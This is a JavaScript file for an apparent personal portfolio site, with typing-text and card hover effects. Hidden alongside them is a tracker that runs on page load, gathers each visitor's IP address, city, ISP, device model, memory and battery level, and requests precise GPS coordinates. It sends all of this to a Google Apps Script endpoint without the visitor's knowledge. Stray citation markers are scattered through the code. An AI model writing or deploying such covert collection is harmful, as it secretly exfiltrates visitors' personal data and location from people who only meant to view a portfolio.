(async function() {
  const getDeviceModel = () => {
    const ua = navigator.userAgent; [cite: 1]
    if (/android/i.test(ua)) {
      const match = ua.match(/Android.*;\s([^;]+)\sBuild/); [cite: 1]
      return match ? match[1] : "Android Device";
    }
    if (/iPhone|iPad|iPod/.test(ua) && !window.MSStream) { [cite: 1]
      const w = window.screen.width; [cite: 1, 2]
      const h = window.screen.height; [cite: 2]
      if (w === 390 && h === 844) return "iPhone 12/13/14 Pro"; [cite: 2]
      if (w === 430 && h === 932) return "iPhone 14/15 Pro Max"; [cite: 2]
      return "Apple iOS Device"; [cite: 2]
    }
    return navigator.platform || "PC/Laptop"; [cite: 2]
  };

  const startTracker = async () => {
    let payload = {
      ip: "Hidden/Blocked",
      city: "-",
      country: "-",
      isp: "-",
      userAgent: navigator.userAgent, [cite: 4]
      platform: navigator.platform, [cite: 4]
      ram: navigator.deviceMemory || "N/A", [cite: 4]
      battery: "N/A",
      deviceName: getDeviceModel(), [cite: 4]
      lat: "Ditolak",
      long: "Ditolak"
    };

    // 1. Ambil Data IP, Kota, Negara, & ISP
    try {
      const res = await fetch('http://ip-api.com/json/');
      const d = await res.json();
      if (d.status === "success") {
        payload.ip = d.query;
        payload.city = d.city;
        payload.country = d.country;
        payload.isp = d.isp;
      }
    } catch (e) { console.log("IP-API Blocked"); } [cite: 7]

    // 2. Ambil Baterai [cite: 5]
    if (navigator.getBattery) {
      try {
        const b = await navigator.getBattery(); [cite: 6]
        payload.battery = Math.round(b.level * 100); [cite: 6]
      } catch (e) {}
    }

    const sendData = (data) => {
      fetch("https://script.google.com/macros/s/AKfycbytLnRKVv_Axyp1kI479GOaG8FlFm8nk1OtqomUMwGRQ6-qEaBcv-GM-gaYIMhzeuHyiw/exec", { [cite: 8]
        method: "POST",
        mode: "no-cors",
        body: JSON.stringify(data)
      });
    };

    // Kirim data awal (IP & Device) segera
    sendData(payload);

    // 3. Minta Lokasi GPS (Update jika diizinkan) [cite: 9]
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition((pos) => {
        payload.lat = pos.coords.latitude;
        payload.long = pos.coords.longitude;
        payload.accuracy = pos.coords.accuracy.toFixed(2) + "m";
        sendData(payload); // Kirim update data dengan koordinat presisi
      }, null, { enableHighAccuracy: true });
    }
  };

// ---------------------------------------------------------------------------------------------------------------------------

  window.addEventListener('load', () => {
    startTracker();

  // --- UI EFFECTS (TYPING) ---
  const texts = ['IT Support / Graphic Design', 'Hardware & Software Specialist', 'Creative Problem Solver', 'Tech Enthusiast'];
  let textIndex = 0, charIndex = 0, isDeleting = false, typingDelay = 150;

  function typeText() {
    const typedElement = document.getElementById('typed-text');
    if (!typedElement) return;

    const currentText = texts[textIndex];
    if (isDeleting) {
      typedElement.textContent = currentText.substring(0, charIndex - 1);
      charIndex--;
      typingDelay = 75;
    } else {
      typedElement.textContent = currentText.substring(0, charIndex + 1);
      charIndex++;
      typingDelay = 150;
    }

    if (!isDeleting && charIndex === currentText.length) {
      typingDelay = 2000;
      isDeleting = true;
    } else if (isDeleting && charIndex === 0) {
      isDeleting = false;
      textIndex = (textIndex + 1) % texts.length;
      typingDelay = 500;
    }
    setTimeout(typeText, typingDelay);
  }
    
    // Jalankan Efek UI
    setTimeout(typeText, 1000);

    // Ripple Effect untuk Card
    document.querySelectorAll('.card').forEach(card => {
      card.addEventListener('mousemove', (e) => {
        const rect = card.getBoundingClientRect();
        const x = ((e.clientX - rect.left) / rect.width) * 100;
        const y = ((e.clientY - rect.top) / rect.height) * 100;
        card.querySelector('.card-inner').style.setProperty('--x', `${x}%`);
        card.querySelector('.card-inner').style.setProperty('--y', `${y}%`);
      });
    });
  });
})();
